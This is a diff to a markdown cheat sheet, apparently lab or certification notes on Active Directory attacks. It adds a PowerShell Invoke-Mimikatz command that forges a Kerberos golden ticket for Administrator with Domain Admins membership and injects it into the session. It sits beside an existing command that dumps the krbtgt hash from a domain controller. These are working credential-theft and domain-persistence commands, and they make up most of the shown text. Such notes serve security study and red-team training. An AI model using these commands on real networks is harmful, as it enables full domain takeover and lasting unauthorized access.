@@ -379,7 +379,13 @@ println "out> $sout err> $err"
 - The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
 - Password change has no effect on this attack.
 
-**Execute mimikatz on DC to get krbtgt hash**
+**Execute mimikatz on DC as Domain Admin privileges to get krbtgt hash**
 - `Invoke-Mimikatz -Command '"lsadump::lsa" /patch -Computername dcorp-dc'`
+
+**On any machine**
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid> /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+```
 
 ## Domain Persistence Part 2
